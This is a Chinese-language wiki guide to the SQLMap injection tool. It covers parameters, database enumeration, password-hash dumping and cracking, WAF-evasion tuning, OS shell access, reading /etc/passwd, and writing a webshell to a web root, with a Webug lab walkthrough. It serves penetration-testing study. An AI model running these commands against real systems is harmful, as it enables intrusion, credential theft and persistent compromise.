---
title: SQLMap 综合指南：从入门到进阶的完整手册
description: 系统梳理 SQLMap 核心功能、安装配置、参数详解、漏洞扫描与枚举实战、性能优化技巧及高级利用功能（OS Shell、文件读写、SQL
  交互等），结合 Webug 靶场实战案例构建完整知识体系。
category: program-analysis
tags:
- SQLMap
- SQL注入
- 渗透测试
- 漏洞扫描
- 数据库枚举
- OS Shell
- 文件读写
- 性能优化
- Webug靶场
- 实战案例
date: '2024-01-15'
updated: '2026-11-15'
---

## 简介

SQLMap 是一款由 Python 语言编写的开源 SQL 注入检测与利用工具，具备强大的检测引擎与丰富特性：自动识别数据库指纹、支持多种注入类型（布尔盲注、报错注入、联合查询、堆叠查询、时间盲注）、数据库枚举、密码哈希破解、操作系统命令执行、文件读写、交互式 Shell 等。完全支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、Informix、HSQLDB、H2 等主流数据库管理系统。

本页面基于学员实战笔记整理，结合 **Webug 4.0** 靶场（[[pikachu-target-writeup-part1-setup-brute-force]]、[[pikachu-target-writeup-part3]] 同属 226 安全团队开源靶场体系）实战案例，系统沉淀 SQLMap 从安装到进阶利用的完整知识体系，适合渗透测试从业者、CTF 选手及安全学习者查阅速查。

> 相关工具生态：[[sqlmap-api-automation]]（REST-JSON API 批量自动化）、[[pocsuite3-vulnerability-testing-framework]]（Knownsec 404 漏洞测试框架）、[[xd-security-python-security-development-notes]]（SqlmapAPI 集成开发实战）。

---

## 安装与环境配置

### 依赖要求

- **Python 2.7.x**（文章基于 Python 2.7.14，现代版本已支持 Python 3，建议使用官方最新版）
- Windows 环境下需手动配置环境变量

### Windows 安装步骤

1. 下载 Python 安装包（官网：www.python.org），安装时 **勾选 "Add Python to PATH"** 自动写入系统环境变量
2. 从 SQLMap 官网下载源码包（示例版本 1.3.73），解压至 Python 安装目录（如 `E:\Python27\sqlmap`）
3. 桌面新建快捷方式：
   - 目标：`C:\Windows\System32\cmd.exe`
   - 起始位置：设置为 SQLMap 目录（如 `E:\Python27\sqlmap`）
   - 命名为 `SQLMAP`
4. 双击快捷方式打开终端，执行 `sqlmap.py -h` 验证安装成功

> Kali Linux 环境下预装 SQLMap，直接执行 `sqlmap -hh` 查看完整帮助。

---

## 核心参数体系速查

> 以下参数表基于文章整理，分类对照官方帮助（`-hh`），实战中常用组合已标注。

### 帮助与版本

| 参数 | 别名 | 作用 |
|------|------|------|
| `-h` | `--help` | 显示基本帮助信息 |
| `-hh` | | 显示详细帮助信息（含所有参数分类） |
| `--version` | | 显示版本号 |
| `-v 0-6` | | 设置输出详细度（0-6 级，默认 1） |

**详细度级别对照**：

- 0：仅关键信息
- 1：信息 + 警告（默认）
- 2：Debug 信息
- 3：注入 Payload
- 4：HTTP 请求
- 5：HTTP 响应头
- 6：HTTP 响应体

### 目标指定

| 参数 | 作用 | 示例 |
|------|------|------|
| `-u` / `--url` | 指定单个目标 URL（必选） | `-u "http://target.com/page.php?id=1"` |
| `-d` | 直接连接数据库 | `-d "mysql://user:pass@host:port/db"` |
| `-l` | 从 Burp Suite 日志读取目标 | `-l /path/to/burp.log` |
| `-m` | 从文本文件批量读取 URL（一行一个） | `-m /path/to/urls.txt` |
| `--threads` | 最大并发请求数（默认 1，最大 10） | `--threads 5` |
| `--timeout` | 请求超时时间（秒，默认 30） | `--timeout 35` |
| `--retries` | 重试次数 | `--retries 3` |

### 枚举与数据提取

| 参数 | 作用 | 典型组合 |
|------|------|----------|
| `-b` / `--banner` | 获取数据库版本信息 | |
| `--current-user` | 当前数据库用户 | |
| `--current-db` | 当前数据库名 | |
| `--is-dba` | 判断是否 DBA 权限 | |
| `--users` | 枚举所有数据库用户 | |
| `--passwords` | 枚举用户密码哈希（支持字典破解） | |
| `--privileges` | 枚举用户权限 | |
| `--roles` | 枚举用户角色 | |
| `--dbs` | 枚举所有数据库 | |
| `--tables` | 枚举指定库所有表 | `-D dbname --tables` |
| `--columns` | 枚举指定表所有列 | `-D dbname -T tbl --columns` |
| `--dump` | 导出指定表数据 | `-D dbname -T tbl --dump` |
| `--dump-all` | 导出所有库表数据 | |
| `--search` | 搜索列/表/库名 | |
| `-D` | 指定目标数据库 | |
| `-T` | 指定目标表 | |
| `-C` | 指定目标列 | |
| `-U` | 指定目标用户 | |
| `--exclude-sysdbs` | 枚举时排除系统库 | |
| `--sql-query` | 执行自定义 SQL 语句 | `--sql-query "SELECT version()"` |
| `--sql-shell` | 交互式 SQL Shell | |

### 操作系统访问（高危功能，需 DBA 权限）

| 参数 | 作用 | 示例 |
|------|------|------|
| `--os-cmd` | 执行单条 OS 命令 | `--os-cmd "whoami"` |
| `--os-shell` | 交互式 OS Shell | `--os-shell` |
| `--priv-esc` | 数据库进程用户提权 | |
| `--file-read` | 读取目标文件系统文件 | `--file-read "/etc/passwd"` |
| `--file-write` | 写入文件到目标文件系统 | `--file-write "/tmp/shell.php"` |

### 通用与优化参数

| 参数 | 作用 |
|------|------|
| `--batch` | 自动选择默认项（Yes），无交互模式 |
| `--output-dir` | 自定义输出目录 |
| `--smart` | 启发式判断，仅对疑似注入点深度测试 |
| `--predict-output` | 预测输出，基于常见特征快速识别 DBMS 版本 |
| `--keep-alive` | 启用 HTTP 长连接 |
| `--null-connection` | 盲注时仅获取响应头判断真假，节省带宽 |
| `-o` | 等同于 `--predict-output --keep-alive --null-connection` 三参数组合 |
| `--delay` | 请求间延迟（秒），规避 WAF/IDS | `--delay 1` |

---

## 漏洞扫描与枚举实战

### 基础检测流程

```bash
# 单点检测
sqlmap.py -u "http://192.168.31.41/control/sqlinject/manifest_error.php?id=1"

# 批量扫描（URL 列表文件）
sqlmap.py -m C:\Users\Administrator\Desktop\11.txt

# 指定注入参数（多参数场景）
sqlmap.py -u "http://target.com/page.php?id=1&cat=2" -p id

# 读取 Burp Suite 日志（需先在 Burp 开启 Proxy → Options → Logging → Requests）
sqlmap.py -l C:\Users\Administrator\Desktop\1.log
```

### 数据库枚举实战链（以 Webug 靶场为例）

```bash
# 1. 获取当前库与用户
sqlmap.py -u "http://target.com/page.php?id=1" --current-db --current-user

# 2. 判断 DBA 权限
sqlmap.py -u "http://target.com/page.php?id=1" --is-dba

# 3. 枚举所有数据库
sqlmap.py -u "http://target.com/page.php?id=1" --dbs

# 4. 指定库枚举表（-D webug）
sqlmap.py -u "http://target.com/page.php?id=1" -D webug --tables

# 5. 指定表枚举列（-T flag）
sqlmap.py -u "http://target.com/page.php?id=1" -D webug -T flag --columns

# 6. 导出目标列数据（-C flag --dump）
sqlmap.py -u "http://target.com/page.php?id=1" -D webug -T flag -C flag --dump
# 结果示例：dfafdasfafdsadfa
```

### 密码哈希枚举与破解

```bash
sqlmap.py -u "http://target.com/page.php?id=1" --passwords
# 交互提示：
# [?] do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n] y
# [?] what dictionary do you want to use? [默认内置字典]
# [?] do you want to use common password suffixes? [Y/n] y
# 成功破解弱口令示例：root / root
```

> 实战中常结合 [[xd-security-pentest-basic-stage-notes]] 中的 SQL 注入模块，配合 Burp Suite Intruder 进行参数级爆破验证。

---

## 性能优化技巧

| 技术 | 参数 | 适用场景 | 不兼容参数 | 说明 |
|------|------|----------|------------|------|
| 预测输出 | `--predict-output` | 快速识别 DBMS 版本、缩小 Payload 范围 | `--threads` | 对比 `/sqlmap/common-outputs.txt` 特征库 |
| 批量模式 | `--batch` | 自动化脚本、多目标扫描 | 无 | 自动应答 Yes |
| HTTP 长连接 | `--keep-alive` | 减少 TCP 三次握手开销 | `--proxy` | 多数代理不支持 Keep-Alive |
| 空连接模式 | `--null-connection` | 盲注大量请求，仅比对响应头长度 | `--text-only` | 节省带宽、降低日志特征 |
| 组合优化 | `-o` | 同时启用上述三项 | 见上 | 一键开启 |
| 多线程 | `--threads N` (1-10) | 高带宽、低延迟环境 | `--predict-output` | 并发请求加速枚举 |
| 超时控制 | `--timeout N` | 目标响应不稳定 | 无 | 默认 30s |
| 重试机制 | `--retries N` | 网络抖动、目标间歇性不可达 | 无 | 建议配合批量扫描使用 |
| 请求延迟 | `--delay N` | 规避 WAF/频率限制、隐蔽渗透 | 无 | 单位：秒 |

**实战建议**：

- **内网/高带宽**：`--threads 5 --batch --keep-alive`
- **外网/需隐蔽**：`--delay 1 --null-connection --batch`
- **自动化批量**：`--batch --smart --threads 3 --timeout 20 --retries 2`

---

## 进阶利用功能

### 权限侦察与横向扩展

```bash
# 判断 DBA 权限
sqlmap.py -u "http://target.com/page.php?id=1" --is-dba

# 枚举数据库角色/管理员（非 DBA 时寻找高权账号）
sqlmap.py -u "http://target.com/page.php?id=1" --roles
```

### 操作系统命令执行

```bash
# 单条命令（Windows 示例）
sqlmap.py -u "http://target.com/page.php?id=1" --os-cmd "ver"

# 交互式 OS Shell（获取 cmd / bash）
sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
# 进入交互提示符：os-shell> whoami
```

> 实战案例参考：[[card-game-platform-penetration-test-case-study]]（MSSQL xp_cmdshell 获取 OS Shell）、[[0x6270-penetration-test-case-study-2023]]（SQLMap 验证 DBA 权限后上线 Cobalt Strike）。

### 交互式 SQL Shell

```bash
# 直接执行任意 SQL 语句（需堆叠查询支持）
sqlmap.py -u "http://target.com/page.php?id=1" --sql-shell
# 进入提示符：sql-shell> SELECT @@version;
```

### 文件系统读写

```bash
# 读取目标文件（Linux / Windows 均支持）
sqlmap.py -u "http://target.com/page.php?id=1" --file-read "C:\\Windows\\system32\\drivers\\etc\\hosts"
sqlmap.py -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"

# 写入文件（需写权限，常用于写 WebShell）
sqlmap.py -u "http://target.com/page.php?id=1" --file-write "/local/path/shell.php" --file-dest "/var/www/html/shell.php"
```

> 文件读写常结合 [[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]] 实现免杀 WebShell 落地。

---

## 实战案例：Webug 靶场显错注入全链路复现

> 环境：Webug 4.0（226 安全团队开源靶场），注入点 `http://192.168.0.107/control/sqlinject/manifest_error.php?id=1`

### 步骤复盘

| 步骤 | 命令 | 关键产出 |
|------|------|----------|
| 1. 验证注入 | `sqlmap.py -u "URL" --dbs` | 6 个数据库：`information_schema`、`mysql`、`webug` 等 |
| 2. 定位目标库 | `sqlmap.py -u "URL" -D webug --tables` | 表：`flag`、`users` 等 |
| 3. 枚举列名 | `sqlmap.py -u "URL" -D webug -T flag --columns` | 列：`flag` |
| 4. 导出 Flag | `sqlmap.py -u "URL" -D webug -T flag -C flag --dump` | `dfafdasfafdsadfa` |

### 等效自动化一键命令

```bash
sqlmap.py -u "http://192.168.0.107/control/sqlinject/manifest_error.php?id=1" \
  -D webug -T flag -C flag --dump --batch -v 3
```

---

## 常见问题与避坑指南

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| Python 环境变量未生效 | 安装时未勾选 Add to PATH | 重装并勾选，或手动添加 `Python安装目录` 与 `Scripts` 至系统 PATH |
| `--threads` 与 `--predict-output` 冲突 | 两者机制互斥 | 二选一：枚举阶段用 `--predict-output`，导出阶段用 `--threads` |
| 代理模式下长连接失败 | 代理不支持 Keep-Alive | 去掉 `--keep-alive` 或 `-o` |
| 盲注速度极慢 | 未使用优化参数 | 加上 `--null-connection`、`--delay 0`、`--threads 5` |
| 密码哈希无法破解 | 哈希算法非内置字典支持 | 导出哈希后使用 Hashcat/JohnTheRipper 离线破解 |
| `--os-shell` 无响应 | 非 DBA 权限 / 堆叠查询不支持 / WAF 拦截 | 先确认 `--is-dba`，尝试 `--os-cmd` 单命令验证，配合 WAF 绕过参数 |

---

## 交叉引用与延伸阅读

### 工具生态

- [[sqlmap-api-automation]] — REST-JSON API 批量自动化扫描架构与 Python 客户端实现
- [[pocsuite3-vulnerability-testing-framework]] — Knownsec 404 漏洞验证框架，支持 SQLMap 插件化调用
- [[xd-security-python-security-development-notes]] — SqlmapAPI 集成开发、FOFA API 联动批量验证实战

### 实战案例库

- [[card-game-platform-penetration-test-case-study]] — 棋牌平台渗透：FOFA 资产收集 → AWVS 扫描 → SQLMap 验证 MSSQL DBA → xp_cmdshell 获取 OS Shell
- [[0x6270-penetration-test-case-study-2023]] — 安服实战：登录口 SQL 注入 → SQLMap 验证 DBA → xp_cmdshell → Cobalt Strike 上线 → 内网横向
- [[cisp-pte-penetration-testing-exam-guide]] — CISP-PTE 考点：SQLMap 基础参数、注入类型识别、数据库枚举流程
- [[xd-security-pentest-basic-stage-notes]] — 小迪安全课程基础阶段：SQLMap 系统化教学大纲与实战笔记索引

### 靶场练习

- [[pikachu-target-writeup-part1-setup-brute-force]] / [[pikachu-target-writeup-part3]] — Pikachu 靶场 SQL 注入全类型复现（数字型/字符型/搜索型/HTTP Header/Cookie/盲注/宽字节）
- [[vulnhub-platform-resource-index]] — VulnHub 750+ 靶机合集，含多个 SQL 注入实战环境

### 防御与审计视角

- [[java-preparedstatement-sql-injection-defense]] — Java PreparedStatement 预编译防御原理与 `ORDER BY` 注入绕过实战
- [[xxe-prevention-java-jaxp]] — Java JAXP XXE 防御配置，同属输入验证防御体系
- [[oasys-system-code-audit]] — MyBatis `${}` 导致 SQL 注入代码审计案例

---

## 版本历史与维护说明

| 版本 | 日期 | 变更摘要 |
|------|------|----------|
| 1.0 | 2024-01-15 | 初版：基于学员笔记整理，覆盖安装、参数、实战、优化、进阶利用五大模块，补全交叉引用 |

> 本页面持续跟踪 SQLMap 官方更新（GitHub: sqlmapproject/sqlmap），重大版本发布时同步补充新参数、新特性实战用法。欢迎通过 Issue 贡献实战案例与参数技巧。

## 来源

- [226安全团队-201805-202103_20](../sources/226安全团队-201805-202103_20.md)
